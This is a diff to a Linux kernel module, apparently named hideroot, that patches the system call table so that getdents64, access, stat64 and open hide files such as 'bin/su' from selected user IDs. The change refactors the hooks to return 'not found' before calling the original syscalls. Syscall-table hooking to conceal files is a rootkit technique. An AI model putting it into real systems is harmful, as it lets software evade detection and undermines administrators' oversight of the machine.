@@ -49,12 +49,12 @@ unsigned long **sys_call_table;
 unsigned long flags;
 
 int hide_uid[100];
-int hide_uid_count=0;
-module_param_array_named(hide_uid, hide_uid, int, &hide_uid_count, 0644);
+unsigned int hide_uid_count=0;
+module_param_array(hide_uid, int, &hide_uid_count, 0644);
 
 char *hide_file[100] = {"bin/su", };
-int hide_file_cnt=1;
-module_param_array_named(hide_file, hide_file, charp, &hide_file_cnt, 0644);
+unsigned int hide_file_cnt=1;
+module_param_array(hide_file, charp, &hide_file_cnt, 0644);
 
 int check_hide_uid(void)
 {
@@ -164,6 +164,8 @@ asmlinkage long my_sys_getdents64(unsigned int fd,
 	}
 
 	copyret = copy_to_user((void *)dirent, (void *)td2, ret);
+
+	copyret = copyret;
 	kfree(td1);
 
       out:
@@ -173,22 +175,12 @@ asmlinkage long my_sys_getdents64(unsigned int fd,
 long (*orig_sys_access) (const char __user * filename, int mode);
 asmlinkage long my_sys_access(const char __user * filename, int mode)
 {
-	int fake = 0;
-	long ret;
+	int fake = check_hide_uid();
 
-	ret = orig_sys_access(filename, mode);
+	if (!fake == 0 && check_hide_file(filename))
+		return -ENOENT;
 
-	fake = check_hide_uid();
-
-	if (fake == 0)
-		return ret;
-	else
-	{
-		if (check_hide_file(filename))
-			return -1;
-		else
-			return ret;
-	}
+	return orig_sys_access(filename, mode);
 }
 
 asmlinkage int my_do_execve(char __user * filename,
@@ -211,33 +203,22 @@ long (*orig_sys_stat64) (const char __user * filename, struct stat64 __user * st
 asmlinkage long my_sys_stat64(const char __user * filename, struct stat64 __user * statbuf)
 {
 	int fake = check_hide_uid();
-	long res = orig_sys_stat64(filename, statbuf);
 
-	if (fake == 0)
-		return res;
+	if (!fake == 0 && check_hide_file(filename))
+		return -ENOENT;
 
-	if (check_hide_file(filename))
-		return -1;
-
-	return res;
+	return orig_sys_stat64(filename, statbuf);
 }
 
 asmlinkage long (*orig_sys_open) (const char __user * filename, int flags, umode_t mode);
 asmlinkage long my_sys_open(const char __user * filename, int flags, umode_t mode)
 {
 	int fake = check_hide_uid();
-	long res = orig_sys_open(filename, flags, mode);
 
-	if (fake == 0)
-		return res;
+	if (!fake == 0 && check_hide_file(filename))
+		return -ENOENT;
 
-	if (check_hide_file(filename))
-	{
-		sys_close(res);
-		return -1;
-	}
-
-	return res;
+	return orig_sys_open(filename, flags, mode);
 }
 
 static int init_hideroot(void)
